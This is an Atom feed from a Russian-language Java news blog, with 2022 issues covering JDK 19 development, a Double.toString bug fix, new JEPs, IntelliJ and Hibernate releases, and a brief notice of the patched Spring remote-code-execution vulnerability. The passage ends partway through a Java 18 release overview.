<?xml version="1.0" encoding="UTF-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>miniJUG</title>
  <link rel="alternate" type="text/html" href="https://minijug.ru" />
  <subtitle type="text">Новости Java</subtitle>
  <id>https://minijug.ru/feed.xml</id>
  <updated>2022-06-12T18:00:00Z</updated>
  <entry>
    <title>Новости Java #41</title>
    <link rel="alternate" type="text/html" href="https://minijug.ru/java_news_41.html" />
    <author>
      <name>Евгений Козлов</name>
    </author>
    <id>https://minijug.ru/java_news_41.html</id>
    <updated>2022-06-12T18:00:00Z</updated>
    <published>2022-06-12T18:00:00Z</published>
    <content type="html">&lt;p&gt;&amp;bull; JDK 19 перешёл в &lt;a href="https://mail.openjdk.java.net/pipermail/jdk-dev/2022-June/006735.html"&gt;первую фазу Rampdown&lt;/a&gt;. Список JEP'ов &lt;a href="http://openjdk.java.net/projects/jdk/19/"&gt;заморожен&lt;/a&gt;, а исходный код ответвлён в &lt;a href="https://github.com/openjdk/jdk19"&gt;стабилизационный репозиторий&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Примечательно, что из всех семи JEP'ов Java 19 только один будет иметь стабильный характер (&lt;a href="https://openjdk.java.net/jeps/422"&gt;Linux/RISC-V Port&lt;/a&gt;). Все остальные будут иметь статус Preview, либо Incubator.&lt;/p&gt;
&lt;p&gt;Тем временем, уже &lt;a href="https://github.com/openjdk/jdk/pull/8236"&gt;началась&lt;/a&gt; разработка Java 20. У нового релиза появилась &lt;a href="https://jdk.java.net/20/"&gt;своя страница&lt;/a&gt;, где можно скачать первую сборку JDK 20-ea+1.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; В Java 19 попал интересный &lt;a href="https://github.com/openjdk/jdk/pull/3402"&gt;патч&lt;/a&gt;, который исправляет &lt;a href="https://bugs.openjdk.org/browse/JDK-4511638"&gt;баг 20-летней давности&lt;/a&gt;. Баг этот заключается в том, что метод &lt;code&gt;Double.toString()&lt;/code&gt; иногда возвращает некорректный результат, например:&lt;/p&gt;
&lt;pre&gt;&amp;gt; jshell
&lt;span style="color: grey"&gt;|  Welcome to JShell -- Version 18.0.1.1
|  For an introduction type: /help intro&lt;/span&gt;

jshell&amp;gt; Double.toString(1e23)
$1 ==&gt; "9.999999999999999E22"&lt;/pre&gt;
&lt;p&gt;В Java 19 это исправлено:&lt;/p&gt;
&lt;pre&gt;&amp;gt; jshell
&lt;span style="color: grey"&gt;|  Welcome to JShell -- Version 19-ea
|  For an introduction type: /help intro&lt;/span&gt;

jshell&amp;gt; Double.toString(1e23)
$1 ==&gt; "1.0E23"&lt;/pre&gt;
&lt;p&gt;Помимо возвращения корректного результата новая реализация также значительно быстрее (в 17.7 раз по &lt;a href="https://mail.openjdk.java.net/pipermail/core-libs-dev/2020-April/065921.html"&gt;замерам автора&lt;/a&gt;), поскольку не выделяет промежуточных объектов, не содержит циклов и использует только целочисленную арифметику.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; В блоге IntelliJ IDEA вышел новый выпуск &lt;a href="https://blog.jetbrains.com/idea/2022/06/java-annotated-monthly-june-2022/"&gt;Java Annotated Monthly&lt;/a&gt; за июнь.&lt;/p&gt;</content>
  </entry>
  <entry>
    <title>Новости Java #40</title>
    <link rel="alternate" type="text/html" href="https://minijug.ru/java_news_40.html" />
    <author>
      <name>Евгений Козлов</name>
    </author>
    <id>https://minijug.ru/java_news_40.html</id>
    <updated>2022-05-29T18:00:00Z</updated>
    <published>2022-05-29T18:00:00Z</published>
    <content type="html">&lt;p&gt;&amp;bull; Вышли обновления Java:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href="https://www.oracle.com/java/technologies/downloads/#java18"&gt;JDK 18.0.1.1&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://www.oracle.com/java/technologies/downloads/#java17"&gt;JDK 17.0.3.1&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://www.oracle.com/java/technologies/downloads/#java11"&gt;JDK 11.0.15.1&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://www.oracle.com/java/technologies/downloads/#java8"&gt;JDK 8u333&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Такое внеплановое обновление пришлось выпустить из-за &lt;a href="https://bugs.openjdk.java.net/browse/JDK-8285468?jql=project%20%3D%20JDK%20AND%20fixVersion%20%3D%2018.0.1.1"&gt;нескольких критических багов&lt;/a&gt; в OpenJDK.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Ещё один JEP предложен к JDK 19. Это &lt;a href="https://openjdk.java.net/jeps/428"&gt;JEP 428: Structured Concurrency (Incubator)&lt;/a&gt;. Это седьмой и, вероятно, последний JEP, который попадёт в этот релиз, поскольку до первой фазы Rampdown остаётся &lt;a href="http://openjdk.java.net/projects/jdk/19/"&gt;меньше двух недель&lt;/a&gt;.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Марк Рейнолд &lt;a href="https://mail.openjdk.java.net/pipermail/discuss/2022-May/006110.html"&gt;заявил&lt;/a&gt; о начале работы над проектом Leyden. У проекта появилась &lt;a href="https://openjdk.java.net/projects/leyden/"&gt;своя страница&lt;/a&gt; на сайте OpenJDK и &lt;a href="https://mail.openjdk.java.net/mailman/listinfo/leyden-dev"&gt;почтовая рассылка&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Напомним, что целью проекта Leyden является решение проблемы медленного старта JVM и большого размера образа. Призыв к обсуждению проекта был ещё &lt;a href="https://mail.openjdk.java.net/pipermail/discuss/2020-April/005429.html"&gt;в апреле 2020 года&lt;/a&gt;, а голосование по нему завершилось &lt;a href="https://mail.openjdk.java.net/pipermail/announce/2020-June/000290.html"&gt;в июне того же года&lt;/a&gt;. Тогда предлагалось, что упомянутые проблемы будут решаться через концепцию статического образа &amp;ndash; автономной программы, которая выполняет целевое приложение и ничего больше.&lt;/p&gt;
&lt;p&gt;В текущем предложении подход будет &lt;a href="https://openjdk.java.net/projects/leyden/notes/01-beginnings"&gt;несколько иным&lt;/a&gt;: движение к "закрытому миру" будет постепенным и инкрементальным. Полностью статические образы будут самой конечной целью, а в промежутке в JDK будут внедряться улучшения, которые разработчики смогут начать использовать раньше.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; JetBrains планирует полностью поменять интерфейс IntelliJ IDEA и других своих IDE. Как &lt;a href="https://blog.jetbrains.com/idea/2022/05/take-part-in-the-new-ui-preview-for-your-jetbrains-ide/"&gt;утверждается&lt;/a&gt; в блоге JetBrains, "тренды графического интерфейса эволюционировали, и многие из наших пользователей говорят нам, что текущий интерфейс кажется тяжеловесным и устаревшим". Поэтому в компании было принято решение разработать абсолютно новый look-and-feel, который будет чистым, современным и мощным.&lt;/p&gt;
&lt;p&gt;Новый графический интерфейс будет внедряться постепенно. Сначала ограниченный круг пользователей сможет принять участие в &lt;a href="https://www.jetbrains.com/lp/intellij-new-ui-preview/"&gt;программе раннего доступа&lt;/a&gt;, где сможет попробовать новый интерфейс и поделиться обратной связью с командой JetBrains. Позже в этом году новый интерфейс станет общедоступным, а в следующем году он станет интерфейсом по умолчанию, сначала для новых пользователей, а потом для всех остальных. После этого старый интерфейс будет всё ещё доступен как минимум в течение года.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Вышел &lt;a href="https://spring.io/blog/2022/05/19/spring-boot-2-7-0-available-now"&gt;Spring Boot 2.7.0&lt;/a&gt;.&lt;/p&gt;</content>
  </entry>
  <entry>
    <title>Новости Java #39</title>
    <link rel="alternate" type="text/html" href="https://minijug.ru/java_news_39.html" />
    <author>
      <name>Евгений Козлов</name>
    </author>
    <id>https://minijug.ru/java_news_39.html</id>
    <updated>2022-05-15T18:00:00Z</updated>
    <published>2022-05-15T18:00:00Z</published>
    <content type="html">&lt;p&gt;&amp;bull; Стало известно ещё о трёх новых JEP, которые попадут в JDK 19.&lt;/p&gt;
&lt;p&gt;Первый &amp;ndash; &lt;a href="https://openjdk.org/jeps/425"&gt;JEP 425: Virtual Threads (Preview)&lt;/a&gt; (этот JEP уже интегрирован в сборку &lt;a href="https://jdk.java.net/19/"&gt;JDK 19-ea+22&lt;/a&gt;).&lt;/p&gt;
&lt;p&gt;Второй &amp;ndash; &lt;a href="https://openjdk.org/jeps/427"&gt;JEP 427: Pattern Matching for switch (Third Preview)&lt;/a&gt;. Про него мы писали в &lt;a href="java_news_37.html"&gt;выпуске #37&lt;/a&gt;, когда он был ещё в статусе черновика.&lt;/p&gt;
&lt;p&gt;Третий &amp;ndash; &lt;a href="https://openjdk.org/jeps/424"&gt;JEP 424: Foreign Function &amp; Memory API (Preview)&lt;/a&gt;. Про него мы писали в &lt;a href="java_news_35.html"&gt;выпуске #35&lt;/a&gt;.&lt;/p&gt;
&lt;p class="pt-1"&gt;Также предложен ко включению в Java 19 &lt;a href="https://openjdk.org/jeps/405"&gt;JEP 405: Record Patterns (Preview)&lt;/a&gt;. Про этот JEP мы писали давно в &lt;a href="java_news_8.html"&gt;выпуске #8&lt;/a&gt;, когда он ещё был озаглавлен как "Record and Array Patterns (Preview)". В текущий JEP было решено не включать паттерны массивов и оставить только паттерны записей. Паттерны массивов отложены на один из будущих JEP'ов.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Марк Рейнолд предложил переименовать домен &lt;a href="https://openjdk.org/"&gt;openjdk.java.net&lt;/a&gt; в &lt;a href="https://openjdk.org"&gt;openjdk.org&lt;/a&gt;. С момента появления OpenJDK в 2007 году вся его инфраструктура (исходный код, веб, e-mail, wiki, задачи) хостится в домене третьего уровня openjdk.java.net, хотя веб-сайт &lt;a href="https://en.wikipedia.org/wiki/Java.net"&gt;java.net&lt;/a&gt; был сайтом для Java-сообщества и имел слабое отношение к разработке самого OpenJDK. В 2017 году этот сайт был закрыт.&lt;/p&gt;
&lt;p&gt;С тех пор много открытого ПО стало хоститься в домене .org, и перемещение туда OpenJDK будет логичным шагом. Также это послужит напоминанием о том, что OpenJDK разрабатывается сообществом, а не одной главенствующей корпорацией.&lt;/p&gt;
&lt;p&gt;Вместе с самим доменом openjdk.java.net также будут переименованы все его активные поддомены (bugs, cr, db, git, hg, mail, wiki). При этом старые ссылки, ведущие на openjdk.java.net, будут перенаправлены на соответствующие адреса в домене openjdk.org.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Вышел в свет новый декомпилятор Java-байткода &lt;a href="https://github.com/QuiltMC/quiltflower"&gt;Quiltflower&lt;/a&gt;. Quiltflower является форком декомпилятора Fernflower, который является стандартным декомпилятором в IntelliJ IDEA. Как &lt;a href="https://www.reddit.com/r/java/comments/ue8u59/new_open_source_java_decompiler/"&gt;утверждает автор&lt;/a&gt;, Quiltflower более точно воспроизводит исходный Java-код и поддерживает различные синтаксические конструкции (try-with-resources, выражения &lt;code&gt;switch&lt;/code&gt;, паттерн-матчинг, sealed-классы и т.д). В доказательство приводятся &lt;a href="https://gist.github.com/SuperCoder7979/c7171b0e34b6eccf0b9f1c37030867dc"&gt;примеры&lt;/a&gt;, сравнивающие результаты декомпиляции Fernflower и Quiltflower.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Роман Кеннке &lt;a href="https://mail.openjdk.org/pipermail/lilliput-dev/2022-May/000457.html"&gt;сообщил&lt;/a&gt;, что проекту &lt;a href="https://openjdk.org/projects/lilliput/"&gt;Lilliput&lt;/a&gt; удалось сократить размер заголовков объектов с 96/128 бит до 64 бит. При этом 64-битные заголовки являются лишь промежуточным шагом, и он заявил, что следующим шагом будет сокращение заголовков ещё сильнее: до 32 бит.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Вышел &lt;a href="http://weld.cdi-spec.org/news/2022/04/29/weld-500Final/"&gt;Weld 5.0.0.Final&lt;/a&gt;, который поддерживает спецификацию &lt;a href="https://jakarta.ee/specifications/cdi/4.0/"&gt;CDI 4&lt;/a&gt;.&lt;/p&gt;</content>
  </entry>
  <entry>
    <title>Новости Java #38</title>
    <link rel="alternate" type="text/html" href="https://minijug.ru/java_news_38.html" />
    <author>
      <name>Евгений Козлов</name>
    </author>
    <id>https://minijug.ru/java_news_38.html</id>
    <updated>2022-04-24T18:00:00Z</updated>
    <published>2022-04-24T18:00:00Z</published>
    <content type="html">&lt;p&gt;&amp;bull; Вышли обновления Java:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href="https://www.oracle.com/java/technologies/javase/18-0-1-relnotes.html"&gt;JDK 18.0.1&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://www.oracle.com/java/technologies/javase/17-0-3-relnotes.html"&gt;JDK 17.0.3&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://mail.openjdk.org/pipermail/jdk-updates-dev/2022-April/013820.html"&gt;JDK 15.0.7&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://mail.openjdk.org/pipermail/jdk-updates-dev/2022-April/013821.html"&gt;JDK 13.0.11&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://www.oracle.com/java/technologies/javase/11-0-15-relnotes.html"&gt;JDK 11.0.15&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="https://mail.openjdk.org/pipermail/jdk8u-dev/2022-April/014839.html"&gt;JDK 8u332&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p class="pt-2"&gt;&amp;bull; Появилось &lt;a href="https://openjdk.org/projects/jdk/19/"&gt;расписание выхода JDK 19&lt;/a&gt;. Общедоступная версия Java 19 по плану должна выйти 20 сентября 2022 года.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Вышел &lt;a href="https://openjdk.org/jeps/426"&gt;JEP 426: Vector API (Fourth Incubator)&lt;/a&gt;, который сразу стал предложен к выходу в JDK 19.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Вышла &lt;a href="https://blog.jetbrains.com/idea/2022/04/intellij-idea-2022-1/"&gt;IntelliJ IDEA 2022.1&lt;/a&gt;. Перечислим главные новшества:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Новый инструмент &lt;i&gt;Dependency Analyzer&lt;/i&gt;, позволяющий находить конфликты зависимостей.&lt;/li&gt;
  &lt;li&gt;Новый улучшенный мастер создания проектов.&lt;/li&gt;
  &lt;li&gt;Новая вкладка &lt;i&gt;Notifications&lt;/i&gt; вместо &lt;i&gt;Event Log&lt;/i&gt;.&lt;/li&gt;
  &lt;li&gt;Улучшенные встроенные подсказки в редакторе, которые теперь отображают автора кода, использования, cвязанные проблемы и производные типы.&lt;/li&gt;
  &lt;li&gt;Обновленные диалоги &lt;i&gt;Structural Search&lt;/i&gt; и &lt;i&gt;Structural Replace&lt;/i&gt;.&lt;/li&gt;
  &lt;li&gt;Отображение уязвимостей в зависимостях (только в Ultimate).&lt;/li&gt;
  &lt;li&gt;Выполнение команд прямо из Markdown-файлов нажатием на иконку рядом с командой.&lt;/li&gt;
  &lt;li&gt;Копирование фрагментов кода из Markdown-файлов в буфер обмена.&lt;/li&gt;
  &lt;li&gt;Новая инспекция Incorrect formatting, предупреждающая о том, соответствует ли форматирование файла настройкам стиля кода.&lt;/li&gt;
  &lt;li&gt;Поддержка Java 18: сниппеты в документации, второе preview паттерн-матчинга для &lt;code&gt;switch&lt;/code&gt;. Кодировкой по умолчанию для Java-файлов теперь является UTF-8 на всех платформах.&lt;/li&gt;
  &lt;li&gt;Улучшенная совместимость декомпилятора Java с Java 17.&lt;/li&gt;
  &lt;li&gt;Поддержка новых возможностей, появившихся в JUnit 5.7.&lt;/li&gt;
  &lt;li&gt;Шаблон &lt;i&gt;Surround with try/catch&lt;/i&gt; теперь выбрасывает исключение, обернутое в &lt;code&gt;RuntimeException&lt;/code&gt;, вместо проглатывания.&lt;/li&gt;
  &lt;li&gt;Новый значок &lt;i&gt;Reset Frame&lt;/i&gt; вместо старого действия &lt;i&gt;Drop Frame&lt;/i&gt; в панели инструментов отладчика.&lt;/li&gt;
&lt;/ul&gt;</content>
  </entry>
  <entry>
    <title>Новости Java #37</title>
    <link rel="alternate" type="text/html" href="https://minijug.ru/java_news_37.html" />
    <author>
      <name>Евгений Козлов</name>
    </author>
    <id>https://minijug.ru/java_news_37.html</id>
    <updated>2022-04-10T18:00:00Z</updated>
    <published>2022-04-10T18:00:00Z</published>
    <content type="html">&lt;p&gt;&amp;bull; Вышел &lt;a href="https://openjdk.org/jeps/425"&gt;JEP 425: Virtual Threads (Preview)&lt;/a&gt;. Это значит, что проект Loom перешёл в свою финальную стадию и результаты многолетней работы над виртуальными нитями в скором времени станут доступны широкой публике.&lt;/p&gt;
&lt;p&gt;Напомним, что о старте проекта Loom было заявлено &lt;a href="project_loom.html"&gt;в ноябре 2017 года&lt;/a&gt; вскоре после выхода Java 9, а первый черновик JEP по виртуальным нитям по нему появился лишь спустя 4 года, о чём мы писали в &lt;a href="java_news_32.html"&gt;выпуске #32&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Вместе с выходом JEP 425 также вышла новая Early-Access сборка Loom &lt;a href="https://jdk.java.net/loom/"&gt;19-loom+5&lt;/a&gt; с большим количеством изменений по сравнению с предыдущей версией.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Вышел черновик &lt;a href="https://openjdk.org/jeps/8282272"&gt;JEP Pattern matching for switch (Third Preview)&lt;/a&gt;. Это значит, что паттерн-матчинг для &lt;code&gt;switch&lt;/code&gt; стал первой языковой конструкцией, которой не хватило два preview, чтобы стать стабильной.&lt;/p&gt;
&lt;p&gt;В этой итерации предлагается внести два изменения относительно предыдущей.&lt;/p&gt;
&lt;p&gt;Во-первых, заменить охранные паттерны на условия &lt;code&gt;when&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;span style="color: green"&gt;// Java 18:&lt;/span&gt;
&lt;span style="color: blue"&gt;switch&lt;/span&gt; (obj) {
    &lt;span style="color: blue"&gt;case&lt;/span&gt; Integer x &amp;&amp; x &gt; 0 -&gt; ...;
    &lt;span style="color: blue"&gt;default&lt;/span&gt; -&gt; ...;
}

&lt;span style="color: green"&gt;// Java 19:&lt;/span&gt;
&lt;span style="color: blue"&gt;switch&lt;/span&gt; (obj) {
    &lt;span style="color: blue"&gt;case&lt;/span&gt; Integer x &lt;span style="color: blue"&gt;when&lt;/span&gt; x &gt; 0 -&gt; ...;
    &lt;span style="color: blue"&gt;default&lt;/span&gt; -&gt; ...;
}&lt;/pre&gt;
&lt;p&gt;О мотивации заменить &lt;code&gt;&amp;&amp;&lt;/code&gt; на &lt;code&gt;when&lt;/code&gt; можно прочитать &lt;a href="https://mail.openjdk.org/pipermail/amber-spec-experts/2022-January/003195.html"&gt;тут&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Во-вторых, предлагается изменить поведения матчинга &lt;code&gt;null&lt;/code&gt; таким образом, чтобы он матчился только в ветках &lt;code&gt;case null&lt;/code&gt; и ни в каких других (даже тотальных):&lt;/p&gt;
&lt;pre&gt;&lt;span style="color: green"&gt;// Java 18:&lt;/span&gt;
Object obj = &lt;span style="color: blue"&gt;null&lt;/span&gt;;
&lt;span style="color: blue"&gt;switch&lt;/span&gt; (obj) {
    &lt;span style="color: blue"&gt;case&lt;/span&gt; Object x -&gt; ...; &lt;span style="color: green"&gt;// matches&lt;/span&gt;
}

&lt;span style="color: green"&gt;// Java 19:&lt;/span&gt;
Object obj = &lt;span style="color: blue"&gt;null&lt;/span&gt;;
&lt;span style="color: blue"&gt;switch&lt;/span&gt; (obj) {
    &lt;span style="color: blue"&gt;case&lt;/span&gt; Object x -&gt; ...; &lt;span style="color: red"&gt;// NPE&lt;/span&gt;
}&lt;/pre&gt;
&lt;p&gt;Про причины такого изменения можно прочитать &lt;a href="https://mail.openjdk.org/pipermail/amber-spec-experts/2022-January/003194.html"&gt;тут&lt;/a&gt;.&lt;/p&gt;

&lt;p class="pt-1"&gt;Также вышло ещё два новых черновика JEP: &lt;a href="https://openjdk.org/jeps/8284289"&gt;Improved way of obtaining call traces asynchronously for profiling&lt;/a&gt; и &lt;a href="https://openjdk.org/jeps/8284453"&gt;Optionally Record Thread Context in JFR&lt;/a&gt;.&lt;/p&gt;


&lt;p class="pt-2"&gt;&amp;bull; Вышел &lt;a href="https://in.relation.to/2022/03/31/orm-60-final/"&gt;Hibernate 6.0 Final&lt;/a&gt;. Новая версия фреймворка не является полностью совместимой с предыдущей версией 5.x, но в значительной степени совместимость удалось сохранить. Для тех, кто использует Hibernate исключительно через &lt;a href="https://docs.jboss.org/hibernate/orm/6.0/migration-guide/migration-guide.html#_jakarta_persistence"&gt;Jakarta Persistence API&lt;/a&gt;, переход должен быть полностью совместимым. Для остальных был написан &lt;a href="https://docs.jboss.org/hibernate/orm/6.0/migration-guide/migration-guide.html"&gt;подробный гид по миграции&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Перечислим некоторые существенные изменения Hibernate 6.0:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Базовая версия Java теперь 11.&lt;/li&gt;
  &lt;li&gt;Java Persistence больше не поддерживается. Hibernate 6.0 можно использовать только с пространством имён &lt;code&gt;jakarta.persistence&lt;/code&gt;, но не &lt;code&gt;javax.persistence&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Теперь используется Read-by-position вместо Read-by-name при чтении из JDBC &lt;code&gt;ResultSet&lt;/code&gt;. Это приводит к улучшению производительности, а также к более компактным и читаемым сгенерированным SQL-запросам.&lt;/li&gt;
&lt;/ul&gt;

&lt;p class="pt-2"&gt;&amp;bull; Вышла &lt;a href="https://newsroom.eclipse.org/eclipse-newsletter/2022/march/what%E2%80%99s-new-jakarta-persistence-31"&gt;Jakarta Persistence 3.1&lt;/a&gt;.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; В Spring обнаружена &lt;a href="https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement"&gt;критическая уязвимость&lt;/a&gt;, позволяющая злоумышленнику выполнить произвольный код. Уязвимости подвержены приложения при следующих условиях:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Приложение запускается на JDK 9 или выше.&lt;/li&gt;
  &lt;li&gt;Используется Apache Tomcat в качестве контейнера сервлетов.&lt;/li&gt;
  &lt;li&gt;Приложение пакуется в WAR, а не JAR.&lt;/li&gt;
  &lt;li&gt;Используются зависимости &lt;code&gt;spring-webmvc&lt;/code&gt; или &lt;code&gt;spring-webflux&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;К моменту публикации уязвимости уже были выпущены новые версии Spring 5.3.18 и 5.2.20, в которых уязвимость была исправлена. На следующий день Apache Tomcat исправил уязвимость на своей стороне, выпустив версии 10.0.20, 9.0.62 и 8.5.78.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Eclipse начал &lt;a href="https://blogs.eclipse.org/post/denis-roy/moving-eclipse-projects-github-and-gitlab"&gt;переезд на GitHub&lt;/a&gt;. Многие проекты на данный момент уже переехали (&lt;a href="https://github.com/eclipse-platform/eclipse.platform"&gt;Platform&lt;/a&gt;, &lt;a href="https://github.com/eclipse-equinox"&gt;Equinox&lt;/a&gt;, &lt;a href="https://github.com/eclipse-platform/eclipse.platform.swt"&gt;SWT&lt;/a&gt;, &lt;a href="https://github.com/eclipse-jdt"&gt;JDT&lt;/a&gt; и т.д).&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Вышел &lt;a href="https://blog.jetbrains.com/idea/2022/04/java-annotated-monthly-april-2022/"&gt;Java Annotated Monthly&lt;/a&gt; за апрель 2022.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Вышел &lt;a href="https://github.com/oracle/helidon/releases/tag/2.5.0"&gt;Helidon 2.5.0&lt;/a&gt;.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Вышел &lt;a href="https://andresalmiray.com/jreleaser-1-0-0-is-here/"&gt;JReleaser 1.0.0&lt;/a&gt;.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Вышел &lt;a href="https://mail.openjdk.org/pipermail/jmh-dev/2022-March/003422.html"&gt;JMH 1.35&lt;/a&gt;.&lt;/p&gt;</content>
  </entry>
  <entry>
    <title>Вышла Java 18</title>
    <link rel="alternate" type="text/html" href="https://minijug.ru/java_18.html" />
    <author>
      <name>Евгений Козлов</name>
    </author>
    <id>https://minijug.ru/java_18.html</id>
    <updated>2022-03-21T18:00:00Z</updated>
    <published>2022-03-21T18:00:00Z</published>
    <content type="html">&lt;p&gt;Вышла общедоступная версия &lt;a href="https://openjdk.org/projects/jdk/18/"&gt;Java 18&lt;/a&gt;. В этот релиз попало более &lt;a href="https://builds.shipilev.net/backports-monitor/release-notes-18.html"&gt;2000 закрытых задач и 9 JEP'ов&lt;/a&gt;. Release Notes можно посмотреть &lt;a href="http://jdk.java.net/18/release-notes"&gt;здесь&lt;/a&gt;. Изменения API можно посмотреть по &lt;a href="https://javaalmanac.io/jdk/18/apidiff/17/"&gt;этой ссылке&lt;/a&gt;.&lt;/p&gt;
&lt;!-- cut --&gt;
&lt;p&gt;Ссылки на скачивание:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href="https://www.oracle.com/java/technologies/downloads/"&gt;Oracle JDK&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="http://jdk.java.net/18/"&gt;OpenJDK&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Перечислим JEP'ы, которые попали в Java 18.&lt;/p&gt;
&lt;h5&gt;&lt;a href="https://openjdk.org/jeps/420"&gt;Паттерн-матчинг для &lt;code&gt;switch&lt;/code&gt; (Second Preview) (JEP 420)&lt;/a&gt;&lt;/h5&gt;
&lt;p&gt;Паттерн-матчинг для &lt;code&gt;switch&lt;/code&gt;, который &lt;a href="https://openjdk.org/jeps/406"&gt;появился в Java 17&lt;/a&gt; в режиме preview, остаётся в этом статусе. В этом релизе присутствует два изменения по сравнению с предыдущей версией.&lt;/p&gt;
&lt;p&gt;Первое изменение &amp;ndash; константные паттерны теперь должны находиться выше, чем паттерны с условиями того же типа. Например, такой код успешно компилируется в Java 17:&lt;/p&gt;
&lt;pre&gt;&lt;span style="color: blue"&gt;switch&lt;/span&gt; (value) {
    &lt;span style="color: blue"&gt;case&lt;/span&gt; Integer i &amp;&amp; bar() -&gt; {}
    &lt;span style="color: blue"&gt;case&lt;/span&gt; 3 -&gt; {}
    &lt;span style="color: blue"&gt;case&lt;/span&gt; Integer i -&gt; {}
}&lt;/pre&gt;
&lt;p&gt;Но не компилируется в Java 18:&lt;/p&gt;
&lt;pre&gt;&amp;gt; javac --enable-preview --release 18 Main.java
&lt;span style="color: red"&gt;Main.java:8: error: this case label is dominated by a preceding case label
            case 3 -&gt; {}
                 ^&lt;/span&gt;&lt;/pre&gt;

&lt;p&gt;Чтобы код компилировался на Java 18, нужно переместить константный паттерн выше:&lt;/p&gt;
&lt;pre&gt;&lt;span style="color: blue"&gt;switch&lt;/span&gt; (value) {
    &lt;span style="color: blue"&gt;case&lt;/span&gt; 3 -&gt; {}
    &lt;span style="color: blue"&gt;case&lt;/span&gt; Integer i &amp;&amp; bar() -&gt; {}
    &lt;span style="color: blue"&gt;case&lt;/span&gt; Integer i -&gt; {}
}&lt;/pre&gt;

&lt;p&gt;Второе изменение &amp;ndash; улучшенная проверка исчерпываемости для дженериков. Например, такой код не компилируется в Java 17, несмотря на то что &lt;code&gt;switch&lt;/code&gt; покрывает все возможные случаи:&lt;/p&gt;
&lt;pre&gt;&lt;span style="color: blue"&gt;sealed interface&lt;/span&gt; Foo&amp;lt;T&amp;gt; { }
&lt;span style="color: blue"&gt;final class&lt;/span&gt; A&amp;lt;T&amp;gt; &lt;span style="color: blue"&gt;implements&lt;/span&gt; Foo&amp;lt;T&amp;gt; { }
&lt;span style="color: blue"&gt;final class&lt;/span&gt; B&amp;lt;T&amp;gt; &lt;span style="color: blue"&gt;implements&lt;/span&gt; Foo&amp;lt;T&amp;gt; { }
&lt;span style="color: blue"&gt;final class&lt;/span&gt; C &lt;span style="color: blue"&gt;implements&lt;/span&gt; Foo&amp;lt;String&amp;gt; { }

&lt;span style="color: blue"&gt;static int&lt;/span&gt; testGenericSealedExhaustive(Foo&amp;lt;Integer&amp;gt; foo) {
    &lt;span style="color: blue"&gt;return switch&lt;/span&gt; (foo) {
        &lt;span style="color: blue"&gt;case&lt;/span&gt; A&amp;lt;Integer&amp;gt; a -&amp;gt; 1;
        &lt;span style="color: blue"&gt;case&lt;/span&gt; B&amp;lt;Integer&amp;gt; b -&amp;gt; 2;
    };
}&lt;/pre&gt;
&lt;pre&gt;javac --enable-preview --release 17 Main.java
&lt;span style="color: red"&gt;Main.java:10: error: the switch expression does not cover all possible input values
    return switch (foo) {
           ^&lt;/span&gt;&lt;/pre&gt;
&lt;p&gt;В Java 18 же такой код успешно компилируется.&lt;/p&gt;

&lt;h5&gt;&lt;a href="https://openjdk.org/jeps/413"&gt;Сниппеты кода в документации Java API (JEP 413)&lt;/a&gt;&lt;/h5&gt;
&lt;p&gt;В JavaDoc теперь поддерживается новый тег &lt;code&gt;@snippet&lt;/code&gt;, который указывает на то, что данный участок является примером кода.&lt;/p&gt;
&lt;p&gt;Пример сниппета кода:&lt;/p&gt;
&lt;pre&gt;/**
 * A simple program.
 * {@snippet :
 *   public class HelloWorld {
 *     public static void main(String... args) {
 *       System.out.println("Hello World!"); // @highlight substring="println"
 *     }
 *   }
 * }
 */&lt;/pre&gt;
